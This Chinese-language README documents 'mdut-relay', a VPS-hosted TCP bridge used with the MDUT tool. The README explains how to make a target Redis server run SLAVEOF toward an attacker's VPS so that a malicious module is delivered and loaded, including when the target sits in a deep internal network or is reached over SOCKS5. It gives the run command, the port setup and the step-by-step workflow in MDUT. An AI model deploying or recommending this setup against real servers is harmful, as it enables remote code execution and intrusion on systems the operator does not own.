# Redis 利用中继说明（mdut-relay）

## 背景

在利用 Redis 主从复制（`SLAVEOF`）加载恶意 Module 时，目标 Redis 必须能够主动连接到我们的 Rogue Server 并同步载荷。然而在以下场景中，MDUT 本地的监听端口对目标不可达：

1. **深层内网环境**：MDUT 本地和目标不在同一网段，目标仅允许出网到特定公网 IP
2. **正向代理（SOCKS5）环境**：MDUT 通过 SOCKS5 打入内网，本地 IP 对目标不可见，目标无法反向连接

**mdut-relay** 是运行在公网 VPS 上的轻量级透明 TCP 流量桥接器，将 MDUT 控制端和目标 Redis 的流量完美桥接，实现无感知的模块投递。

## 运行机制

```
[MDUT 本地] ──连接──> [VPS:21000 (控制端)]
                          │ mdut-relay 双向转发
[目标 Redis] ──连接──> [VPS:21001 (目标端)]
```

1. `mdut-relay` 启动后监听两个端口：控制端端口（默认 `21000`）和目标连入端口（默认 `21001`）
2. MDUT 发起部署时，主动连接 `21000` 端口
3. MDUT 告诉目标 Redis 执行 `SLAVEOF vps_ip 21001`
4. 目标 Redis 主动连入 `21001` 端口
5. `mdut-relay` 配对两个连接，开始全双工透明转发，载荷投递完成后断开

> 内建 15 秒超时重置机制，目标未能连上时 Relay 自动断开重置，避免队列阻塞死锁。

## 使用说明

### 第一步：在 VPS 上运行

从 [mdut-relay releases](https://github.com/Ch1ngg/mdut-relay/releases) 下载对应架构的二进制，赋予执行权限后运行：

```bash
chmod +x mdut-relay-linux-amd64
./mdut-relay-linux-amd64 -c 21000 -r 21001
```

参数说明：

| 参数 | 说明 | 默认值 |
|------|------|--------|
| `-c` | 控制端端口（供 MDUT 客户端连入） | `21000` |
| `-r` | 目标端端口（供目标 Redis 连入） | `21001` |

🚨 **重要**：确保 VPS 防火墙/安全组**同时放行 21000 和 21001 端口的 TCP 入站流量**！

### 第二步：在 MDUT 中配置

在 MDUT 的 Redis「注入并部署 Module」弹窗中：

1. 选择 **「VPS 中转 (ServeRelay)」** 模式
2. **VPS Relay 控制端地址**：填入 `VPS的IP:21000`
3. **VPS 目标连入 IP**：填入 `VPS的IP`
4. 点击注入即可

### 第三步：完成

MDUT 会自动完成以下流程：
1. 连接 VPS 控制端（21000）
2. 指示目标 Redis 以 slave 身份连接 VPS 目标端（21001）
3. Relay 配对后双向转发，Module 载荷到达目标并加载
4. 投递完成后自动断开

## 使用场景

| 场景 | 是否需要中继 |
|------|------------|
| 目标 Redis 可直接访问，本地有公网 IP | ❌ 不需要 |
| 目标通过 SOCKS5 代理访问，本地无公网 IP | ✅ 需要 |
| 目标在深层内网，本地不可达 | ✅ 需要 |
| 本地有公网 IP 但端口被防火墙拦截 | ✅ 需要 |

## 注意事项

- 中继仅做透明转发，不保存任何数据
- 每次利用完成后建议重启中继，避免旧连接残留
- VPS 的 21000/21001 端口在利用完成后建议关闭

## 项目地址

[https://github.com/Ch1ngg/mdut-relay](https://github.com/Ch1ngg/mdut-relay)
